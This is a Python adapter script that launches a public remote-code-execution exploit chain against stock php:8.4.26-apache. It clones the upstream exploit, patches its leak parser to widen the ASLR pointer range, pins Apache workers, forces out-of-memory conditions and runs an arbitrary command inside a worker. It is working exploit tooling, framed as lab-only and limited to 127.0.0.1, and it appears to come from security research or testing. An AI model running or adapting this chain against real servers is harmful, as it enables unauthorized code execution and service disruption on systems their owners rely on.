#!/usr/bin/env python3
"""Run the verified stock-php:8.4.26-apache chain.

This is an adapter around the public 9bie pure-HTTP research exploit. The
upstream checkout is intentionally not vendored here because that repository
does not carry a license; clone it yourself and point --upstream at it.

The adapter only changes one upstream portability detail in a temporary copy:
the leak parser filters for 0x7f... addresses, while the local kernel may map
the worker at 0x7x.... The chain itself is unchanged.

Target requirements (verified):
  * php:8.4.26-apache, stock php.ini-production
  * display_errors=Off, memory_limit=128M, post_max_size=8M
  * output_buffering=4096 (stock php.ini-production; raw no-ini defaults fail)
  * official prefork MPM, MaxRequestWorkers=150
  * a PHP page (the launcher uses `<?php echo "OK\\n"; ?>`)
  * target reachable on 127.0.0.1; the worker-pinning step opens 149 local
    partial requests and is intentionally not a remote scanning feature.

Usage:
  git clone --depth 1 https://github.com/9bie/php2shell-bypass-aslr-exp \
      vendor/php2shell-bypass-aslr-exp
  bash lab/start-pure-8426.sh
  python3 default_config.py --proof out/pure-8426/p1

Only use this on systems you own or are explicitly authorized to test.
"""
from __future__ import annotations

import argparse
import os
import shutil
import subprocess
import sys
import tempfile
import urllib.error
import urllib.request


UPSTREAM_DEFAULT = "vendor/php2shell-bypass-aslr-exp"


def check_target(port: int) -> bool:
    """Reject the common failure: a raw image with no PHP endpoint."""
    url = f"http://127.0.0.1:{port}/index.php"
    req = urllib.request.Request(url, headers={"User-Agent": "php2shell-default/1"})
    try:
        with urllib.request.urlopen(req, timeout=8) as resp:
            status = resp.status
            headers = resp.headers
            body = resp.read(4096)
    except urllib.error.HTTPError as exc:
        status = exc.code
        headers = exc.headers
        body = exc.read(512)
    except OSError as exc:
        print(f"cannot reach {url}: {exc}", file=sys.stderr)
        return False
    if status != 200:
        print(f"target {url} returned HTTP {status}; no PHP endpoint is running",
              file=sys.stderr)
        print("start the stock target with lab/start-pure-8426.sh; a raw "
              "`docker run php:8.4.26-apache` has no index.php, no /out, and "
              "no php.ini-production", file=sys.stderr)
        return False
    php = headers.get("X-Powered-By", "")
    if php and "8.4.26" not in php:
        print(f"unsupported target version: X-Powered-By={php!r}; this chain "
              "is calibrated for PHP 8.4.26 only", file=sys.stderr)
        return False
    print(f"[*] preflight: HTTP {status} {php or 'PHP version not advertised'}",
          file=sys.stderr)
    return True


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--port", type=int, default=18110,
                    help="local stock-8.4.26 target port")
    ap.add_argument("--workers", type=int, default=150,
                    help="prefork MaxRequestWorkers; official image default is 150")
    ap.add_argument("--proof", default="out/pure-8426/p1",
                    help="proof path on the host, inside the target's /out mount")
    ap.add_argument("--outdir", default=None,
                    help="host out directory (default: dirname of --proof)")
    ap.add_argument("--cmd", default="id>/out/p1",
                    help="command executed in the worker; keep it short")
    ap.add_argument("--arch", choices=("x86_64", "aarch64", "auto"),
                    default="x86_64")
    ap.add_argument("--retries", type=int, default=3)
    ap.add_argument("--timeout", type=float, default=600.0)
    ap.add_argument("--upstream", default=UPSTREAM_DEFAULT,
                    help="checkout of the public 9bie research repository")
    args = ap.parse_args()

    if not check_target(args.port):
        return 2

    upstream = os.path.abspath(os.path.expanduser(args.upstream))
    exploit = os.path.join(upstream, "exploit.py")
    pure = os.path.join(upstream, "pure")
    if not os.path.isfile(exploit) or not os.path.isdir(pure):
        print(f"missing upstream checkout: {upstream}", file=sys.stderr)
        print("clone it with:", file=sys.stderr)
        print("  git clone --depth 1 https://github.com/9bie/php2shell-bypass-aslr-exp "
              f"{args.upstream}", file=sys.stderr)
        return 2

    proof = os.path.abspath(os.path.expanduser(args.proof))
    outdir = os.path.abspath(os.path.expanduser(args.outdir or os.path.dirname(proof)))
    os.makedirs(outdir, exist_ok=True)

    with tempfile.TemporaryDirectory(prefix="php2shell-default-") as tmp:
        # Keep the upstream scripts next to the temp entry point via a symlink.
        os.symlink(pure, os.path.join(tmp, "pure"), target_is_directory=True)
        shutil.copy2(exploit, os.path.join(tmp, "exploit.py"))
        entry = os.path.join(tmp, "exploit.py")
        with open(entry, "r", encoding="utf-8") as fh:
            src = fh.read()
        # 9bie's parser assumes 0x7f...; use canonical 64-bit user addresses.
        patched = src.replace("0x7F0000000000 <= q", "0x100000000000 <= q")
        if patched != src:
            with open(entry, "w", encoding="utf-8") as fh:
                fh.write(patched)
            print("[*] patched leak pointer range for non-0x7f ASLR bases",
                  file=sys.stderr)
        else:
            print("[!] upstream pointer-range marker not found; using upstream as-is",
                  file=sys.stderr)

        cmd = [sys.executable, entry,
               "--port", str(args.port),
               "--workers", str(args.workers),
               "--proof", proof,
               "--outdir", outdir,
               "--cmd", args.cmd,
               "--arch", args.arch,
               "--retries", str(args.retries),
               "--timeout", str(args.timeout)]
        print("[*] target: stock php:8.4.26-apache on 127.0.0.1:"
              f"{args.port}", file=sys.stderr)
        print("[*] this pins Apache workers and triggers OOM; lab use only",
              file=sys.stderr)
        rc = subprocess.call(cmd)
        if rc != 0:
            print("hint: B1 no-heap-pointer failures usually mean the target is "
                  "using raw no-ini defaults (output_buffering=0); copy the "
                  "image's php.ini-production or use lab/start-pure-8426.sh",
                  file=sys.stderr)
        return rc


if __name__ == "__main__":
    raise SystemExit(main())
